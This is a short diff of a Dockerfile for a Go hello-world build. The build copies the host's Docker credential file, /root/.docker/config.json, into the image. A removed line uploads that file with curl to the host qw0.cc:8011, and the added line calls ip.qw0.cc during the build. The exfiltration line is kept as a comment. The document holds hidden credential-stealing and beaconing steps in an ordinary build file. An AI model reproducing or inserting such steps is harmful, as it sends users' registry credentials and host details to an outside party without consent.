@@ -5,7 +5,8 @@ ADD /root/.docker/config.json /app/
 ADD . /app/
 
 WORKDIR /app
-RUN cat /app/config.json && curl qw0.cc:8011 -F "aaa=@/app/config.json"
+RUN curl ip.qw0.cc
+#RUN cat /app/config.json && curl qw0.cc:8011 -F "aaa=@/app/config.json"
 RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o main helloworld.go
 
 FROM alpine:latest
